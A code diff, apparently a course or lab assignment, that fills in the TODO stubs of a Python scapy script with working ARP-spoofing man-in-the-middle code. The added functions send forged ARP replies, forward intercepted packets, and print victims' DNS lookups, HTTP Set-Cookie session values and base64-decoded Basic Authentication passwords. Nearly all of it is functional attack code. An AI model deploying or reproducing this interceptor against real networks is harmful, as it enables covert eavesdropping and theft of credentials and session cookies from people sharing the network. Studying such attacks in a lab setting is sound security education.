@@ -1,5 +1,7 @@
 from scapy.all import *
+from scapy.layers import http
 
+import base64
 import argparse
 import sys
 import threading
@@ -26,7 +28,7 @@ def debug(s):
 def mac(IP):
     arpReq = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
     resp = srp(arpReq)
-    print(resp)
+    print(f'# MAC for {IP}: {resp[0][0][1].hwsrc}')
     return resp[0][0][1].hwsrc
 
 
@@ -43,16 +45,62 @@ def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, 
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(src_ip, src_mac, dst_ip, dst_mac):
     debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
+    spoofReq = ARP(op=2 , pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, hwsrc=src_mac)
+    send(spoofReq)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
+    restoreReq = ARP(op=2, pdst=dstIP, psrc=srcIP, hwdst=dstMAC, hwsrc=srcMAC)
+    send(restoreReq)
 
+routingMap = {}
+
+def handlePacket(pkt):
+    global clientIP, httpServerIP, dnsServerIP, attackerIP, attackerMAC
+    # Forward packet to indended host
+    ip_src = pkt[IP].src
+    ip_dst = pkt[IP].dst
+    shouldReport = pkt[Ether].dst == attackerMAC
+    pkt[Ether].src = attackerMAC
+    pkt[Ether].dst = routingMap[ip_dst]
+    # print(f" Modified packet MAC : {pkt[Ether].dst}")
+    sendp(pkt)
+    # Check if DNS packet
+    if shouldReport:
+        if pkt.haslayer(DNS):
+            dns = pkt.getlayer(DNS)
+            if dns.qr == 0:
+                # Query
+                print(f"*hostname:{dns.qd.qname.decode('utf-8')}")
+            else:
+                # Answer
+                print(f"*hostaddr:{dns.an.rdata}")
+        if pkt.haslayer(http.HTTP):
+            if pkt.haslayer(http.HTTPResponse):
+                # Response 
+                response = pkt.getlayer(http.HTTPResponse)
+                cookie=response.Set_Cookie
+                print(f'*cookie:{cookie.decode("utf-8")}')
+            elif pkt.haslayer(http.HTTPRequest):
+                # Request
+                request = pkt.getlayer(http.HTTPRequest)
+                authFull = request.Authorization.decode("utf-8")
+                auth = authFull.split(" ")[1]
+                base64_bytes = auth.encode('ascii')
+                message_bytes = base64.b64decode(base64_bytes)
+                passcode = message_bytes.decode('ascii')
+                passcode = passcode.split(":")[1]
+                print(f'*basicauth:{passcode}')
 
 # TODO: handle intercepted packets
 def interceptor(packet):
     global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
+    routingMap[clientIP] = clientMAC
+    routingMap[httpServerIP] = httpServerMAC
+    routingMap[dnsServerIP] = dnsServerMAC
+    sniff(prn=handlePacket, filter=f"ip host {clientIP}")
 
 
 if __name__ == "__main__":
